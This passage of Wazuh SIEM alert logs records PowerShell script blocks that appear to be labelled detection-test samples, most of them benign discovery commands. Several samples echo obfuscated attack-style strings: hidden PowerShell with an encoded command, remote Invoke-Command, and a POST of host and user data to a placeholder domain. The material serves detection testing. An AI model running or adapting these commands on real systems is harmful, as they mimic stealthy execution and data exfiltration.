$indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"7c97e40a-7568-4a63-a393-bad24d189416\"}}}","id":"1784280964.442662","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":11,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:04.243+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e7b697dd-4d18-4861-867c-3379d0f63aa1","scriptBlockText":"$sampleId='PST-082'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721944","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-082'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e7b697dd-4d18-4861-867c-3379d0f63aa1\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:03.6422804Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:03.6422804Z\",\"eventRecordID\":\"721944\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-082'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e7b697dd-4d18-4861-867c-3379d0f63aa1\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-082'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e7b697dd-4d18-4861-867c-3379d0f63aa1\"}}}","id":"1784280964.448173","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":3,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:36:04.249+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"78ea57c0-5d7d-4ae1-8acf-1aa9984cf8fb","scriptBlockText":"$sampleId='PST-083'; $parts=@('InVO`KE-Comm`A','nD -COMpu`T`ERnaMe',' ''hoST.exAmplE.INV','alid'' -sCri`PtB','lOck { pOWe`rSH','elL.ExE -NopRo`f','ilE -ENCODedCo','MMAnD vWbYAGKAD','ABLAC0AtWb1AHQ','AcAB1aHqAiaAnAFqasab','fAfMasqbtAc0A','SqBoAEuAuGBuaCCA',' }'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721948","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-083'; $parts=@('InVO`KE-Comm`A','nD -COMpu`T`ERnaMe',' ''hoST.exAmplE.INV','alid'' -sCri`PtB','lOck { pOWe`rSH','elL.ExE -NopRo`f','ilE -ENCODedCo','MMAnD vWbYAGKAD','ABLAC0AtWb1AHQ','AcAB1aHqAiaAnAFqasab','fAfMasqbtAc0A','SqBoAEuAuGBuaCCA',' }'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 78ea57c0-5d7d-4ae1-8acf-1aa9984cf8fb\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:03.9854401Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:03.9854401Z\",\"eventRecordID\":\"721948\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-083'; $parts=@('InVO`KE-Comm`A','nD -COMpu`T`ERnaMe',' ''hoST.exAmplE.INV','alid'' -sCri`PtB','lOck { pOWe`rSH','elL.ExE -NopRo`f','ilE -ENCODedCo','MMAnD vWbYAGKAD','ABLAC0AtWb1AHQ','AcAB1aHqAiaAnAFqasab','fAfMasqbtAc0A','SqBoAEuAuGBuaCCA',' }'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 78ea57c0-5d7d-4ae1-8acf-1aa9984cf8fb\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-083'; $parts=@('InVO`KE-Comm`A','nD -COMpu`T`ERnaMe',' ''hoST.exAmplE.INV','alid'' -sCri`PtB','lOck { pOWe`rSH','elL.ExE -NopRo`f','ilE -ENCODedCo','MMAnD vWbYAGKAD','ABLAC0AtWb1AHQ','AcAB1aHqAiaAnAFqasab','fAfMasqbtAc0A','SqBoAEuAuGBuaCCA',' }'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"78ea57c0-5d7d-4ae1-8acf-1aa9984cf8fb\"}}}","id":"1784280964.448173","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:04.258+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"faf9d73d-1395-4e22-ab61-97b7852f4418","scriptBlockText":"$sampleId='PST-084'; Write-Host ('Host: ' + $env:COMPUTERNAME + '; User: ' + $env:USERNAME); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721951","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-084'; Write-Host ('Host: ' + $env:COMPUTERNAME + '; User: ' + $env:USERNAME); Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: faf9d73d-1395-4e22-ab61-97b7852f4418\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:04.3153681Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:04.3153681Z\",\"eventRecordID\":\"721951\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-084'; Write-Host ('Host: ' + $env:COMPUTERNAME + '; User: ' + $env:USERNAME); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: faf9d73d-1395-4e22-ab61-97b7852f4418\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-084'; Write-Host ('Host: ' + $env:COMPUTERNAME + '; User: ' + $env:USERNAME); Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"faf9d73d-1395-4e22-ab61-97b7852f4418\"}}}","id":"1784280965.450352","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":12,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:05.300+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f5b2b900-58ca-4181-aaf1-4cee8ab0a90b","scriptBlockText":"$sampleId='PST-085'; Get-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721964","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-085'; Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f5b2b900-58ca-4181-aaf1-4cee8ab0a90b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:04.6517919Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:04.6517919Z\",\"eventRecordID\":\"721964\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-085'; Get-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f5b2b900-58ca-4181-aaf1-4cee8ab0a90b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-085'; Get-ItemProperty -Path 'HKCU:\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f5b2b900-58ca-4181-aaf1-4cee8ab0a90b\"}}}","id":"1784280965.450352","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:05.433+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"282b201f-4bd5-468a-9110-2d09f6210a20","scriptBlockText":"$sampleId='PST-086'; Write-Output $PROFILE; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721967","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-086'; Write-Output $PROFILE; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 282b201f-4bd5-468a-9110-2d09f6210a20\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:04.9819675Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:04.9819675Z\",\"eventRecordID\":\"721967\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-086'; Write-Output $PROFILE; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 282b201f-4bd5-468a-9110-2d09f6210a20\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-086'; Write-Output $PROFILE; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"282b201f-4bd5-468a-9110-2d09f6210a20\"}}}","id":"1784280965.450352","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:05.479+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c0af7646-1be4-4588-bd4a-d5e867083e72","scriptBlockText":"$sampleId='PST-087'; $indicator='poWersHELL.Exe -NoProfIlE -wiNDOwStylE HidDeN -eNCOdEDComMAnD vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721971","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-087'; $indicator='poWersHELL.Exe -NoProfIlE -wiNDOwStylE HidDeN -eNCOdEDComMAnD vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c0af7646-1be4-4588-bd4a-d5e867083e72\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:05.3100892Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:05.3100892Z\",\"eventRecordID\":\"721971\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-087'; $indicator='poWersHELL.Exe -NoProfIlE -wiNDOwStylE HidDeN -eNCOdEDComMAnD vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c0af7646-1be4-4588-bd4a-d5e867083e72\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-087'; $indicator='poWersHELL.Exe -NoProfIlE -wiNDOwStylE HidDeN -eNCOdEDComMAnD vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c0af7646-1be4-4588-bd4a-d5e867083e72\"}}}","id":"1784280966.450352","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:06.317+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"cfc6f670-8b95-401f-a349-480f65c350bf","scriptBlockText":"$sampleId='PST-088'; $parts=@('Invoke-Res','tMethod -Met','hod Post',' -Uri ''h','ttps://api.ex','ample.i','nvalid/','checkin'' -','Body @{h','ost=''WS-01'';use','r=''analyst'';','status=''ok''}'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721987","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-088'; $parts=@('Invoke-Res','tMethod -Met','hod Post',' -Uri ''h','ttps://api.ex','ample.i','nvalid/','checkin'' -','Body @{h','ost=''WS-01'';use','r=''analyst'';','status=''ok''}'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: cfc6f670-8b95-401f-a349-480f65c350bf\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:05.6347514Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:05.6347514Z\",\"eventRecordID\":\"721987\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-088'; $parts=@('Invoke-Res','tMethod -Met','hod Post',' -Uri ''h','ttps://api.ex','ample.i','nvalid/','checkin'' -','Body @{h','ost=''WS-01'';use','r=''analyst'';','status=''ok''}'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: cfc6f670-8b95-401f-a349-480f65c350bf\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-088'; $parts=@('Invoke-Res','tMethod -Met','hod Post',' -Uri ''h','ttps://api.ex','ample.i','nvalid/','checkin'' -','Body @{h','ost=''WS-01'';use','r=''analyst'';','status=''ok''}'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"cfc6f670-8b95-401f-a349-480f65c350bf\"}}}","id":"1784280966.450352","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:06.360+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"aac006de-5f38-4aa2-a7aa-ce4834057510","scriptBlockText":"$sampleId='PST-089'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721989","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-089'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: aac006de-5f38-4aa2-a7aa-ce4834057510\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:05.9719609Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:05.9719609Z\",\"eventRecordID\":\"721989\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-089'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: aac006de-5f38-4aa2-a7aa-ce4834057510\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-089'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"aac006de-5f38-4aa2-a7aa-ce4834057510\"}}}","id":"1784280966.450352","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:06.365+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"85dcb97b-0d7b-4d8f-a9b9-02c3609288c7","scriptBlockText":"$sampleId='PST-090'; Get-Process ` | Select-Object -First 3 Name, Id; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721993","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-090'; Get-Process `\n| Select-Object -First 3 Name, Id; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 85dcb97b-0d7b-4d8f-a9b9-02c3609288c7\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:06.3456233Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:06.3456233Z\",\"eventRecordID\":\"721993\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-090'; Get-Process `\\n| Select-Object -First 3 Name, Id; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 85dcb97b-0d7b-4d8f-a9b9-02c3609288c7\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-090'; Get-Process ` | Select-Object -First 3 Name, Id; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"85dcb97b-0d7b-4d8f-a9b9-02c3609288c7\"}}}","id":"1784280967.452568","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":4,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:36:07.355+0200"}
